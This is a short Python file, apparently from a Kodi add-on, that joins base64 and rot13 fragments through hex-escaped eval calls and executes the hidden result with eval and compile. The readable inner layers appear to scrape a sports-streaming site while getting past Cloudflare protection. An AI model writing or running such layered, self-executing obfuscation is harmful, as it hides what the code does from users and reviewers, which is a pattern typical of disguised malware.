
import base64, codecs
thecrew = 'DQppbXBvcnQgYmFzZTY0LCBjb2RlY3MNCnRoZWNyZXcgPSAnRFFwcGJYQnZjblFnWW1GelpUWTBMQ0JqYjJSbFkzTU5DblJvWldOeVpYY2dQU0FuWVZjeGQySXpTakJKU0Vwc1kxaFdiR016VW5wRVVYQndZbGhDZG1OdVVXZGpiVlZPUTIxYWVXSXlNR2RaYmswd1NVZHNkR05IT1hsa1EwSkRXbGRHTVdSSGJHMWtWM2hVWWpOV2QwUlJjSEJpV0VKMlkyNVJaMk16YkhwRVVYQnRZMjA1ZEVsSVNteGpNamt4WTIxT2JHTjVOWE5oVjBsbllWY3hkMkl6U2pCSlIwNXRZekpPZVZsWVFteEVVVzlxWVZjeGQySXpTakJKU0docFlsZE9ibVJYYTA1RFp6QkxXVmRrYkdKdVVXZFFVMEZ1VkZjNU5tRlhlSE5aVXpneFRHcEJaMHRHWkhCaWJWSjJaRE5OWjFSc1VXZE9hVFI0VDNsQ1dHRlhOREpPUkhOblpVUlpNRXRUUWtKalNFSnpXbFprYkZscmRIQmtRemd4VFhwamRVMTZXV2RMUlhSSlZrVXhUVXhEUW5OaFYzUnNTVVZrYkZreWRIWkxVMEpFWVVoS2RtSlhWWFpPZWxsMVRVTTBlazlFUVRWTWFrVjZUV2xDVkZsWFdtaGpiV3QyVGxSTk0weHFUVEpLZHpCTFJGRndibGxYTVd4WU1uaHdZek5SWjFCVFFtSllVVEJMUkZGd2ExcFhXV2RhTWxZd1dESmthR0pYVm5wTFEyczJSRkZ2WjBsRFFXZGpNazU1V1ZoQ2JHTnBRVGxKUjA1dFl6Sk9lVmxZUW14TWJVNTVXbGRHTUZwV09YcFpNMHBvWTBkV2VVdERhMDVEYVVGblNVTkNiMlJITVhOSlJEQm5ZekpPZVZsWVFteGphVFZ1V2xoUmIwb3lhREJrU0VFMlRIazVNMlF6WTNWak0xSjVXbGRHZEZwWFJucGtRelZ6WVZoYWJFd3lOVzFpUXpGNlpFaEtiRmxYTVhwTWVXTnpZVWRXYUZwSFZubGplakUzU2pOV2VscFlTWFJaVjJSc1ltNVJiazl0Um01YVZ6VXdabE5yZFZreU9YVmtSMVoxWkVFd1MwbERRV2RKU0U1MlpGaEJaMUJUUWtOYVYwWXhaRWRzYldSWGVGUmlNMVozUzBkb01HSlhkM05LTW1nd1lsZDNkV05IUm5sak1sWjVTbmxyVGtOcFFXZEpRMEpvU1VRd1oyTXlPVEZqUXpWdFlWYzFhMWd5Um5OaVEyZHVXa2RzTWtwNWVHcGlSMFo2WXpFNE9XVjVaR3BpTW5kMFlsZFJkRTE1UW1waU1uY25EUXBrYjJWemJuUWdQU0FuWjNKVldtZEJiRTlxVEVwRmVHNUtOV0ZaU2pVeGIxUnFkSEZVU1RSeFVERm1UVXBOTUZjek1HTlJSR0owVmxCT2RFMTZPV3hXVkVWMWNWUlNkRzVLTkhSTVIySkJVSFpPZEZaUVRuUldVRTUwY1YnDQpkb2VzbnQgPSAnRTVaVDlIRlVFUUV4OTRHUmdTcUl5NkdKQWlyeEV2SW1XU0wzUzJwVE1aWnpnMXBRQU9wMEFZTXpTa0lSeTFvME1rQkl1VEFHT0FGM0hqSEhFdn'
doesnt = 'SGGHEULHIXFSV1ZRy5EJgkFwyLExgOnHyIrJqjFH4kpHgCFHpmrJylrRI2pUcen1cHAIySFx1OEJSBZaOWEGInIQyVEyE1DHM3FGAioIqGpxy1EUOYFJcnrSA3o3uAnx15pTklFyAcpaq5MxqVGJcZZKx2EHg5Jyc3rGEUFR0jGRgGJHIYL01SZ0I1FxyCn0jjZTkOFaydpau1qHcFMzcZZIAFGUuGEUS4AGOWrH9Qo1VkJHIUH2clq0HjE0qKE00jZIqPFx1bEwOFnxuVEKMRFH8lERcwnaWurJWjFH8kGRtkJHIYDHSnrHSuE0uaoxk5qIElHyARpISCGUOEDIAiHwSLFQWkFxuUGmOTq1WdERyCZScGqHSWHax2FKySn3WYH0qPFwSeFHykAHqFLzcZrQOfFQWkDHIuqQWVFRI2pIAAERquEJcnrSAzE1WaD3WYGmWUq3yXFIWGAaOEI09iHzgMEmA5GKW4H2MUFTAUJyVkI0WXZIcnZKRkpSASI29GqHElHyARpKt1ZRy5G0AZLIAVJxcAFxuUGmOjHIqCo1WeJHpmrJckq0y1E0uaHxk5pTkkE09eFHt0ZxcXnwInZ1WgpSE1nybjFJMUFTAUGGNkJRtlZJgVHHy6o3uaDKWWrTkOF2AcFSSGM3OWFHglFTgLJxbkGJ9IG3cirHIKpHtkFRMXn2ciE1VmFJ1OI29VZIyWraSnEzSGAJ8lH1WZFSp2FQWGDHM3FTcjZR00oyWdoRWXqJgWHayvpRt0nxcGGHEULHIXFHuGL3OVM0WkHxSHEmSCDHM5JzgjFHH1pzSGJT4jpJynZUyxFyASZIcHBIuhrx1YJzSVnz8jL2EhIH9VFQWenyc4rJMWZzf0ERyCZxquEHcVHwxkFKyFnaSIGzkPE1AdFSSWAz94LwSlHzMfFQWAnHuIEKIUFHH1JaykMz4mpJyWH0SapSSFARWYI2MjF3ScJacwLJ8jL1WAZJAzEmAknIc6L2SjrHuuHHEwrT9fGwyJHUSOpIV1AHEupH1WZIqyGRyjZJ94n0gOE1A2EGAkLH1FpHcOIRIEJxgOoxxkLzcTq1cdpSWSEJ8lpIqRZSAuFabjAKWVrIIVraI4EGOWLHkWpQOAZKyVomN1HJ5VH2STFRSCGGO5HHEXpKuSZzcdGUukFH0kG0qRrzqAFyAKLxqHZJ5jISqaFRb5JSc5I2cAIUy3pQS4oUWHqKqnZQI6FSA1oJ96EIIWraI2FQWRAHLkJwSnH2AZoySCHxuXBJSTFRSCGGO5HHEXpIqSZaH1FaykGH0kG0qRrzqAFyAKLxqHZIEZrTWfoyI5oxxkrJuXH1WdEwO5HHEXpIqRZSAuExuOG256DIMTLH92o3yGnH1FpJLaQDcxolN9VPqAE0cVIyuBnSASpUAKoJklITgBpSSKMRcEZRMhH1IBDybjn3cuE2kcIwN1qIcTMUWxIxcVLxqbnIW6oUIGZR5lMSqFFSMdHzgGEaO3I2kbn2WUGaOnZwIGI0IjAIydGxcvn3uRHJ5jn1ASoUMKn2EUGHMfITRmDxIIImyhH1IBDybjoREEI2EXHwW4qSAIMTguE0cLIyqxnSM6Hz5nEJEmGHqXFSMHJxIIImyhH1IBDybjoREEI2EXHGOToyAIGxAAI050MQWxHIHjFaMM'
do = 'MjFXYlVSUmIyZEpRMEZuU1VOQlowbERRV2RKUTBKdlpFY3hjMGxFTUdkak1rNTVXVmhDYkdOcE5XNWFXRkZ2WkZoS2MweEhhR3haVjFKc1kyNU5PV1Y1WkRGak1sWjVURmRHYmxwWE5UQktlbkJvV2pKV2RXUklNSEJNYlU1MlltNVNiR0p1VVU1RGFVRm5TVU5CWjBsRFFXZEpRMEZuU1VoT2RtUllRV2RRVTBKRFdsZEdNV1JIYkcxa1YzaFVZak5XZDB0SGFEQmlWM2R6U2pKb01HSlhkM1ZqUjBaNVl6SldlVXA1YTA1RGFVRm5TVU5CWjBsRFFXZEpRMEZuU1VkYWVWbFhNV3hKUkRCbll6STVNV05ETlcxaFZ6VnJTME5rY0ZwdVNtaGlWMVZ1UzFFd1MwbERRV2RKUTBGblNVTkJaMGxEUVdkaFYxbG5XbTVLYUdKWFZUWkVVVzluU1VOQlowbERRV2RKUTBGblNVTkJaMGxEUVdkYWJrcG9ZbGRWWjFCVFFtMWpiVVowV2xaemJtTXpTbXBLTVRCT1EybEJaMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEpRMEowV1ZoT01GcFlTV2RRVTBKNldTY05DbVJ5WVcxaElEMGdKek5YZFhCVVNXeFplbkY1Y1ZCMWVuQjZVMmROUm10aVRVcFRlRTFMVjIxRFMyWmhjSHBKZWsxTFYzbHdkbkEyY1V0WFpuTkdlR2hNTWpsb2NWUkphSEZPTUZoV1VFNTBWbEJPZEZaUVRuUldVRTUwVmxCT2RGWlZRV2x4UzA1MFEwWlBVRTFLVXpGeFZIbDZjVXByUjI4elNXcFlWREYxY0RORmVYQjJhbUZ1VlVWbmIxQTFha3hMVjIxTlMxWmhXRVF3V0ZaUVRuUldVRTUwVmxCT2RGWlFUblJXVUU1MFZsUXdiWEZIZEhSRFJrOXNUVVkxZDI4eU1XcHVTbXQ1V0ZCeGJXOHpTV3hNTWtnMlZsQldZbGwyWmk5WVJsWmhXVlZYZVZsNFJVTkpVbE5hUjFCNGFFMTZlV2hOVkZObWIxQjFiWEZWVm1Kd01qa3hjRkExYW5CNlNUQnhWSGw2Y2taNFkxRkVZblJXVUU1MFZsQk9kRlpRVG5SV1VFNTBWbEJPZEc5SFFURkNVRTQ1VmxRd2JYRkhkVzlhVXpCQlVIWk9kRlpRVG5SV1VFNTBWbCcNCmRyYW1hID0gJ09CcVNNREdhRUpIUjlhSndBVkFTTUVaVUVpRTBSa0R5T0JNSU1ER3pTbUgweWdHSGdKTTBFWHBLeWlMSEQ1STJrenFSa1hwS3lpTEhFMEpUa2pyeHU2RktjQUYxcTVwVXBqTElNRE1hRUFMSXExbzBjVkRJTzJHYUVKSFI1MEl5T0JxU01ER2FFSkhSNTBJeU9Db0tTSUkzeVpGd09iR1JnQ254MVhBS3VMSUpNdXBJRTVaVDlIRlRTUExISXdwSUVlckl5RHBKMWtJSXE1R1JiakxIVzZaVDFrRTNINUpSRGpKU01ER2FFSkhSNTBJeU9CcVNNREdhRUpIUjUwSXlFS29SMVhIMklFRVRXMEl5T0JxU01ER2FFSkhSNTBJeU9Dcko5SURLeVBxUU9MSXlPQnFTTURHYUVKSFI1MEl5T0JxU0'
drama = '1RE2SSFxyGpJMUFTAUGHyGHxkuEHcVHwHjFKyCDaSGGHuTFx1dJau0ZxuVEKMkH01RE2SSFxuFAGOWrH9PpIAAERpmpJynq0udo3uvZIcVZIWnH3ISEIEKZRy5G0WkIH82ExqCn0LkpJWWrHyCJyICAxMYFJySHH9ZFRuSqxEWGmWRFzAdpzS5LaOWGmSZFQSMEHgOnybjFJMUFTAUGGS1EUOWEIETHHyQEGSKMHqWpJMlIRSSEIEJBIqdZSujrxygpSEWq3SDGwyJHUSjpySjoRgIqQWArJf0DJ1SpUWEJzgYIKEgJzkjDIOuFJ1ZFwI4pxb5ZIMEZUEAF011o1O0LHgIqQAOH2f0DKq1pUWEGQSYIKDlJwSeARSgI3OlHHjkF1I0Z0SfpTAJHTM0GHgAqJ9DqTSYIKDlJwSeARS6GKOlHHjjF1I0ZxSWnmEOq0SjpySjoHgIqTkAFJf0DKqSpUWEGQSYIKDlJwSeARS6GKOlHHjjF1I0ZxSWnmEnq3IjpySZZRgIqQWArJf0DKqWpUWEpT1YIKDlGHyeARSgEKOlHIq3F1I0oScGnmEOoIqjpySZZHgIqQAnZJf0DJ1CpUWEGQSYIKDlJwSeARSgEKOlHIL1I2k4qSufG3ykryAzJSOkpUWEGQOYIKDlGKMjL1MDMaEAF011o1O0LHgIqQWnZJf0DKcApUWEGQOYIKDlDHyeARS3DKOlHKOgF1I0oR1WnmEOq0IjpySZZHgIqQWnZJf0DKcApUWEGQOYIKDlDHyeASc3qKOlHHjjF1I0Z1c5nmEOq1AjpySArRgIqQWnFJf0JacOpUWEIzcYIKDmJayeARS3FKOlHKOgF1I0Z1cGnmEOq0yjpySZoHgIqQAOH2f0Jaq4LIuRZSuAF011o1O1q28lZJchFzg5JSEKqKNlFQWOHQI2DKqSrR1XDJyAIRuvGHgAqJ9DqTSYIKDmDHyeARSgDKOlHHkeF1I0Zx1WnmEOq0IjpySjAHgIqQWArJf0DJ1VLIuTrTMKoJggpIIKL296pPgKoTcuGHg1rHkfpTALEQ09Wj0XpzImpTIwqPN9VPqprQplKUt2Myk4AmEprQZkKUtmZlpAPaImLJ5xrJ91VQ0tMKMuoPtaKUt3ASk4AwuprQL1KUt2Z1k4AmWprQL1KUt3AlpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt2Myk4AwIprQpmKUt2MIk4AmEprQWwKUtlZSk4AmWprQL1KUt3Z1k4AmOprQL1KUt2Z1k4AmEprQV5WlxtXlOyqzSfXPqprQL0KUt2MvpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt3Zyk4AwSprQMxKUt2ZIk4ZzAprQVjKUt3Zyk4AwIprQpmKUt3ZSk4AwIprQLmKUt3ASk4ZwxaXD0XMKMuoPuwo21jnJkyXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt3AIk4AmAprQLkKUt2MIk4AwEprQp5KUt2Myk4AmHaXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
respect = '\x72\x6f\x74\x31\x33'
usandyou = eval('\x74\x68\x65\x63\x72\x65\x77') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x6f\x65\x73\x6e\x74\x2c\x20\x72\x65\x73\x70\x65\x63\x74\x29') + eval('\x64\x6f') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x72\x61\x6d\x61\x2c\x20\x72\x65\x73\x70\x65\x63\x74\x29')
eval(compile(base64.b64decode(eval('\x75\x73\x61\x6e\x64\x79\x6f\x75')),'<string>','exec'))